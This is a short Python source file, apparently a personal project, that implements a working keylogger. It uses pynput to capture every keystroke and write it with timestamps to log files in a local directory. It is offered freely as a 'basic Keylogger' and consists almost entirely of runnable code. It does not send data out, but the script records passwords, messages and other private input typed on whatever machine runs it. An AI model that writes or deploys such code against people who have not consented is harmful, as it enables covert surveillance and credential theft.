#!/usr/bin/env python
# -*-coding:utf-8 -*-
'''
@File    :   keylogger.py
@Time    :   2021/05/29 21:18:49
@Author  :   Shanto Roy 
@Version :   1.0
@Contact :   sroy10@uh.edu
@License :   Free to use/modify/share
@Desc    :   A basic Keylogger that stores key logs in a local directory
'''


from pynput.keyboard import Key, Listener
import logging
import os
from datetime import datetime


class Keylogger:
        
    def create_log_directory(self):
        sub_dir = "log"
        cwd = os.getcwd()
        self.log_dir = os.path.join(cwd,sub_dir)
        if not os.path.exists(sub_dir):
            os.mkdir(sub_dir)
    
    
    @staticmethod
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            logging.info(e)
        
            
    def write_log_file(self):
        # time format example: '2021-05-29-171747'
        time = str(datetime.now())[:-7].replace(" ", "-").replace(":", "")
        # logging info in the file
        logging.basicConfig(
                 filename=(os.path.join(self.log_dir, time) + "-log.txt"),
                 level=logging.DEBUG, 
                 format= '[%(asctime)s]: %(message)s',
             )
        
        with Listener(on_press=self.on_press) as listener:
            listener.join()



if __name__ == "__main__":
    klog = Keylogger()
    klog.create_log_directory()
    klog.write_log_file()